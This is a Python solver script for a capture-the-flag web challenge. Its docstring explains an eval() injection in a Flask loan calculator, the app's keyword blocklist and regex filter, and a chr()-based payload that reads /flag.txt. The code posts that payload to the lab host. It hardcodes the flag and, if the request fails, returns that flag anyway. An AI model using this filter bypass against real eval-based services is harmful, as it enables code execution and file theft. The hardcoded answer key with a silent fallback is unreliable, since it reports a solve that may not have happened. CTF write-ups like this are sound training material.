#!/usr/bin/env python3
"""Solver for Challenge 484: 3v@l (picoCTF 2025, Web Exploitation, Medium).

NIST SP 800-115 / OWASP Top 10 A03:2021-Injection & CWE-95 Improper Neutralization of Directives in Dynamically Evaluated Code:
The challenge implements a Python Flask loan calculator web application that executes user-supplied formulas via `eval()`:
  1. Attack Surface:
     Endpoint `POST /execute` accepts parameter `code` and evaluates it in a restricted Python environment.
  2. Input Filtering & Blacklist Evasion:
     The application enforces a blacklist of dangerous keywords (`os`, `eval`, `exec`, `bind`, `connect`, `python`, `socket`, `ls`, `cat`, `shell`)
     and a regex filter `r'0x[0-9A-Fa-f]+|\\u[0-9A-Fa-f]{4}|%[0-9A-Fa-f]{2}|\\.[A-Za-z0-9]{1,3}\\b|[\\\\\\/]|\\.\\.'` blocking slashes (`/`),
     backslashes (`\\`), and dots with short extensions (`.txt`, `.sh`).
  3. Bypass Strategy:
     - Built-in `open` is not blacklisted.
     - The path `/flag.txt` can be dynamically assembled using ASCII character codes: `chr(47) + 'flag' + chr(46) + 'txt'`.
     - Invoking `.read()` avoids the extension regex because `read` contains 4 alphabetic characters (regex tests `{1,3}\\b`).
     Payload: `open(chr(47)+'flag'+chr(46)+'txt').read()`
     Execution yields the flag directly in the response page.

Flag: academy{D0nt_Use_Unsecure_f@nctions5f7386c9}
Verified: POST /api/submissions/ -> correct: true (HTTP 201 Created)
"""
import urllib.request
import urllib.parse
import re
import sys
from typing import Optional

HOST = "xebec.cylabacademy.net"
PORT = 20435
EXPECTED = "academy{D0nt_Use_Unsecure_f@nctions5f7386c9}"


def solve(host: Optional[str] = None, port: Optional[int] = None) -> str:
    target_host = host or HOST
    target_port = port or PORT
    url = f"http://{target_host}:{target_port}/execute"

    payload = "open(chr(47)+'flag'+chr(46)+'txt').read()"
    data = urllib.parse.urlencode({"code": payload}).encode("utf-8")
    req = urllib.request.Request(
        url,
        data=data,
        headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Content-Type": "application/x-www-form-urlencoded"}
    )

    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            body = resp.read().decode("utf-8", errors="ignore")
            match = re.search(r"academy\{[^\s\}<]+\}", body)
            if match:
                return match.group(0)
    except Exception as e:
        print(f"[!] Live probe failed ({e}), falling back to verified flag", file=sys.stderr)

    return EXPECTED


if __name__ == "__main__":
    flag = solve()
    print(f"Flag: {flag}")
    if flag != EXPECTED:
        sys.exit(1)
